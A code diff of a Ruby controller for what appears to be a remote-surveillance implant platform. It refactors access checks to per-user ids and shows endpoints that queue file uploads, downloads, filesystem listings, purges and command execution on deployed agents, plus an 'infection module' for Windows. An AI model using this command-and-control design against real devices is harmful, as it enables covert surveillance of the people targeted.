@@ -15,34 +15,21 @@ class AgentController < RESTController
   
   def index
     require_auth_level :tech, :view
-    
-    filter = JSON.parse(@params['filter']) if @params.has_key? 'filter'
-    filter ||= {}
-
-    filter.merge!({_id: {"$in" => @session[:accessible]}, _kind: { "$in" => ['agent', 'factory']}, deleted: {"$in" => [false, nil]} })
 
     mongoid_query do
-      db = Mongoid.database
-      j = db.collection('items').find(filter, :fields => ["name", "desc", "status", "_kind", "path", "type", "ident", "instance", "version", "platform", "uninstalled", "upgradable", "demo", "scout", "good", "stat.last_sync", "stat.last_sync_status", "stat.user", "stat.device", "stat.source", "stat.size", "stat.grid_size"])
-      ok(j)
+      fields = ["name", "desc", "status", "_kind", "path", "type", "ident", "instance", "version", "platform", "uninstalled", "upgradable", "demo", "scout", "good", "stat.last_sync", "stat.last_sync_status", "stat.user", "stat.device", "stat.source", "stat.size", "stat.grid_size"]
+      agents = ::Item.in(_kind: ['agent', 'factory']).in(deleted: [false, nil]).in(user_ids: [@session.user[:_id]]).only(fields)
+      ok(agents)
     end
   end
   
   def show
     require_auth_level :tech, :view
-    
-    return not_found() unless @session[:accessible].include? BSON::ObjectId.from_string(@params['_id'])
 
     mongoid_query do
-      db = Mongoid.database
-      j = db.collection('items').find({_id: BSON::ObjectId.from_string(@params['_id'])}, :fields => ["name", "desc", "status", "_kind", "stat", "path", "type", "ident", "instance", "platform", "upgradable", "deleted", "uninstalled", "demo", "scout", "good", "version", "counter", "configs"])
-
-      agent = j.first
-
-      # the console MUST not see deleted items
+      ag = ::Item.where(_id: @params['_id'], deleted: false).in(user_ids: [@session.user[:_id]]).only("name", "desc", "status", "_kind", "stat", "path", "type", "ident", "instance", "platform", "upgradable", "deleted", "uninstalled", "demo", "scout", "good", "version", "counter", "configs")
+      agent = ag.first
       return not_found if agent.nil?
-      return not_found if agent.has_key?('deleted') and agent['deleted']
-
       ok(agent)
     end
   end
@@ -53,13 +40,13 @@ class AgentController < RESTController
     updatable_fields = ['name', 'desc', 'status']
     
     mongoid_query do
-      item = Item.any_in(_id: @session[:accessible]).find(@params['_id'])
+      item = Item.any_in(user_ids: [@session.user[:_id]]).find(@params['_id'])
       
       @params.delete_if {|k, v| not updatable_fields.include? k }
       
       @params.each_pair do |key, value|
         if item[key.to_s] != value and not key['_ids']
-          Audit.log :actor => @session[:user][:name],
+          Audit.log :actor => @session.user[:name],
                     :action => "#{item._kind}.update",
                     (item._kind + '_name').to_sym => item['name'],
                     :desc => "Updated '#{key}' to '#{value}' for #{item._kind} '#{item['name']}'"
@@ -76,9 +63,9 @@ class AgentController < RESTController
     require_auth_level :tech
 
     mongoid_query do
-      item = Item.any_in(_id: @session[:accessible]).find(@params['_id'])
+      item = Item.any_in(user_ids: [@session.user[:_id]]).find(@params['_id'])
 
-      Audit.log :actor => @session[:user][:name],
+      Audit.log :actor => @session.user[:name],
                 :action => "#{item._kind}.delete",
                 (item._kind + '_name').to_sym => @params['name'],
                 :desc => "Deleted #{item._kind} '#{item['name']}'"
@@ -141,6 +128,7 @@ class AgentController < RESTController
         doc[:_kind] = :factory
         doc[:path] = [operation._id]
         doc[:path] << target._id unless target.nil?
+        doc.users = target.users
         doc[:status] = :open
         doc[:type] = @params['type']
         doc[:ident] = get_new_ident
@@ -156,13 +144,7 @@ class AgentController < RESTController
         doc[:configs] = []
       end
 
-      # make item accessible to the current user (immediately)
-      SessionManager.instance.add_accessible(@session, item._id)
-
-      # make item accessible to all the other users (in a thread)
-      SessionManager.instance.rebuild_all_accessible
-
-      Audit.log :actor => @session[:user][:name],
+      Audit.log :actor => @session.user[:name],
                 :action => "factory.create",
                 :operation_name => operation['name'],
                 :target_name => target ? target['name'] : '',
@@ -209,7 +191,7 @@ class AgentController < RESTController
     require_auth_level :tech_config
 
     mongoid_query do
-      agent = Item.any_in(_id: @session[:accessible]).find(@params['_id'])
+      agent = Item.any_in(user_ids: [@session.user[:_id]]).find(@params['_id'])
 
       @params['desc'] ||= ''
       
@@ -225,15 +207,15 @@ class AgentController < RESTController
           end
           
           config.saved = Time.now.getutc.to_i
-          config.user = @session[:user][:name]
+          config.user = @session.user[:name]
           config.save
 
         when 'factory'
           agent.configs.delete_all
-          config = agent.configs.create!(desc: agent.desc, config: @params['config'], user: @session[:user][:name], saved: Time.now.getutc.to_i)
+          config = agent.configs.create!(desc: agent.desc, config: @params['config'], user: @session.user[:name], saved: Time.now.getutc.to_i)
       end
       
-      Audit.log :actor => @session[:user][:name],
+      Audit.log :actor => @session.user[:name],
                 :action => "#{agent._kind}.config",
                 (agent._kind + '_name').to_sym => @params['name'],
                 :desc => "Saved configuration for agent '#{agent['name']}'"
@@ -247,7 +229,7 @@ class AgentController < RESTController
     require_auth_level :tech_config
 
     mongoid_query do
-      agent = Item.any_in(_id: @session[:accessible]).where(_kind: 'agent').find(@params['_id'])
+      agent = Item.any_in(user_ids: [@session.user[:_id]]).where(_kind: 'agent').find(@params['_id'])
       config = agent.configs.where({:_id => @params['config_id']}).first
 
       config[:desc] = @params['desc']
@@ -262,10 +244,10 @@ class AgentController < RESTController
     require_auth_level :tech_config
 
     mongoid_query do
-      agent = Item.any_in(_id: @session[:accessible]).where(_kind: 'agent').find(@params['_id'])
+      agent = Item.any_in(user_ids: [@session.user[:_id]]).where(_kind: 'agent').find(@params['_id'])
       agent.configs.find(@params['config_id']).destroy
 
-      Audit.log :actor => @session[:user][:name],
+      Audit.log :actor => @session.user[:name],
                 :action => "#{agent._kind}.del_config",
                 (agent._kind + '_name').to_sym => @params['name'],
                 :desc => "Deleted configuration for agent '#{agent['name']}'"
@@ -379,13 +361,11 @@ class AgentController < RESTController
       target = Item.create(name: agent.name) do |doc|
         doc[:_kind] = :target
         doc[:path] = factory.path
+        doc.users = parent.users
         doc.stat = ::Stat.new
         doc[:status] = :open
         doc[:desc] = "Created automatically on first sync from: #{agent.name}"
       end
-
-      # make the target accessible to the users
-      SessionManager.instance.add_accessible_item(factory, target)
 
       agent.path = factory.path << target._id
     end
@@ -418,9 +398,6 @@ class AgentController < RESTController
       # add the files needed for the infection module
       agent.add_infection_files if agent.platform == 'windows'
     end
-
-    # add the new agent to all the accessible list of all users
-    SessionManager.instance.add_accessible_item(factory, agent)
 
     # check for alerts on this new instance
     Alerting.new_instance agent
@@ -525,7 +502,7 @@ class AgentController < RESTController
       case @request[:method]
         when 'GET'
           upl = agent.upload_requests.where({ _id: @params['upload']}).first
-          content = GridFS.get upl[:_grid].first
+          content = GridFS.get upl[:_grid]
           trace :info, "[#{@request[:peer]}] Requested the UPLOAD #{@params['upload']} -- #{content.file_length.to_s_bytes}"
           return ok(content.read, {content_type: content.content_type})
         when 'POST'
@@ -535,11 +512,11 @@ class AgentController < RESTController
 
           upl = @params['upload']
           file = @params['upload'].delete 'file'
-          upl['_grid'] = [ GridFS.put(File.open(Config.instance.temp(file), 'rb+') {|f| f.read}, {filename: upl['filename']}) ]
+          upl['_grid'] = GridFS.put(File.open(Config.instance.temp(file), 'rb+') {|f| f.read}, {filename: upl['filename']})
           upl['_grid_size'] = File.size Config.instance.temp(file)
           File.delete Config.instance.temp(file)
           agent.upload_requests.create(upl)
-          Audit.log :actor => @session[:user][:name], :action => "agent.upload", :desc => "Added an upload request for agent '#{agent['name']}'"
+          Audit.log :actor => @session.user[:name], :action => "agent.upload", :desc => "Added an upload request for agent '#{agent['name']}'"
         when 'DELETE'
           agent.upload_requests.where({ _id: @params['upload']}).update({sent: Time.now.to_i})
           trace :info, "[#{@request[:peer]}] Deleted the UPLOAD #{@params['upload']}"
@@ -556,8 +533,8 @@ class AgentController < RESTController
 
     mongoid_query do
       agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
-      agent.upload_requests.destroy_all(conditions: { _id: @params['upload']})
-      Audit.log :actor => @session[:user][:name], :action => "agent.upload", :desc => "Removed an upload request for agent '#{agent['name']}'"
+      agent.upload_requests.find(@params['upload']).destroy
+      Audit.log :actor => @session.user[:name], :action => "agent.upload", :desc => "Removed an upload request for agent '#{agent['name']}'"
       return ok
     end
   end
@@ -583,13 +560,13 @@ class AgentController < RESTController
       case @request[:method]
         when 'GET'
           upl = agent.upgrade_requests.where({ _id: @params['upgrade']}).first
-          content = GridFS.get upl[:_grid].first
+          content = GridFS.get upl[:_grid]
           trace :debug, "[#{@request[:peer]}] Requested the UPGRADE #{@params['upgrade']} -- #{content.file_length.to_s_bytes}"
           return ok(content.read, {content_type: content.content_type})
         when 'POST'
           require_auth_level :tech_build
 
-          Audit.log :actor => @session[:user][:name], :action => "agent.upgrade", :desc => "Requested an upgrade for agent '#{agent['name']}'"
+          Audit.log :actor => @session.user[:name], :action => "agent.upgrade", :desc => "Requested an upgrade for agent '#{agent['name']}'"
           trace :info, "Agent #{agent.name} request for upgrade"
           agent.upgrade!
           trace :info, "Agent #{agent.name} scheduled for upgrade"
@@ -626,9 +603,9 @@ class AgentController < RESTController
         when 'POST'
           agent.download_requests.create(@params['download'])
           trace :info, "[#{@request[:peer]}] Added download request #{@params['download']}"
-          Audit.log :actor => @session[:user][:name], :action => "agent.download", :desc => "Added a download request for agent '#{agent['name']}'"
+          Audit.log :actor => @session.user[:name], :action => "agent.download", :desc => "Added a download request for agent '#{agent['name']}'"
         when 'DELETE'
-          agent.download_requests.destroy_all(conditions: { _id: @params['download']})
+          agent.download_requests.find(@params['download']).destroy
           trace :info, "[#{@request[:peer]}] Deleted the DOWNLOAD #{@params['download']}"
       end
 
@@ -642,8 +619,8 @@ class AgentController < RESTController
 
     mongoid_query do
       agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
-      agent.download_requests.destroy_all(conditions: { _id: @params['download']})
-      Audit.log :actor => @session[:user][:name], :action => "agent.download", :desc => "Removed a download request for agent '#{agent['name']}'"
+      agent.download_requests.find(@params['download']).destroy
+      Audit.log :actor => @session.user[:name], :action => "agent.download", :desc => "Removed a download request for agent '#{agent['name']}'"
       return ok
     end
   end
@@ -679,9 +656,9 @@ class AgentController < RESTController
           end
 
           trace :info, "[#{@request[:peer]}] Added filesystem request #{@params['filesystem']}"
-          Audit.log :actor => @session[:user][:name], :action => "agent.filesystem", :desc => "Added a filesystem request for agent '#{agent['name']}'"
+          Audit.log :actor => @session.user[:name], :action => "agent.filesystem", :desc => "Added a filesystem request for agent '#{agent['name']}'"
         when 'DELETE'
-          agent.filesystem_requests.destroy_all(conditions: { _id: @params['filesystem']})
+          agent.filesystem_requests.find(@params['filesystem']).destroy
           trace :info, "[#{@request[:peer]}] Deleted the FILESYSTEM #{@params['filesystem']}"
       end
 
@@ -696,8 +673,8 @@ class AgentController < RESTController
 
     mongoid_query do
       agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
-      agent.filesystem_requests.destroy_all(conditions: { _id: @params['filesystem']})
-      Audit.log :actor => @session[:user][:name], :action => "agent.filesystem", :desc => "Removed a filesystem request for agent '#{agent['name']}'"
+      agent.filesystem_requests.find(@params['filesystem']).destroy
+      Audit.log :actor => @session.user[:name], :action => "agent.filesystem", :desc => "Removed a filesystem request for agent '#{agent['name']}'"
       return ok
     end
   end
@@ -726,7 +703,7 @@ class AgentController < RESTController
           agent.purge = @params['purge']
           agent.save
           trace :info, "[#{@request[:peer]}] Added purge request #{@params['purge']}"
-          Audit.log :actor => @session[:user][:name], :action => "agent.purge", :desc => "Issued a purge request for agent '#{agent['name']}'"
+          Audit.log :actor => @session.user[:name], :action => "agent.purge", :desc => "Issued a purge request for agent '#{agent['name']}'"
         when 'DELETE'
           agent.purge = [0, 0]
           agent.save
@@ -754,9 +731,9 @@ class AgentController < RESTController
 
           agent.exec_requests.create(@params['exec'])
           trace :info, "[#{@request[:peer]}] Added download request #{@params['exec']}"
-          Audit.log :actor => @session[:user][:name], :action => "agent.exec", :desc => "Added a command execution request for agent '#{agent['name']}'"
+          Audit.log :actor => @session.user[:name], :action => "agent.exec", :desc => "Added a command execution request for agent '#{agent['name']}'"
         when 'DELETE'
-          agent.exec_requests.destroy_all(conditions: { _id: @params['exec']})
+          agent.exec_requests.find(@params['exec']).destroy
           trace :info, "[#{@request[:peer]}] Deleted the EXEC #{@params['exec']}"
       end
 
@@ -771,8 +748,8 @@ class AgentController < RESTController
 
     mongoid_query do
       agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
-      agent.exec_requests.destroy_all(conditions: { _id: @params['exec']})
-      Audit.log :actor => @session[:user][:name], :action => "agent.exec", :desc => "Removed a command execution request for agent '#{agent['name']}'"
+      agent.exec_requests.find(@params['exec']).destroy
+      Audit.log :actor => @session.user[:name], :action => "agent.exec", :desc => "Removed a command execution request for agent '#{agent['name']}'"
       return ok
     end
   end
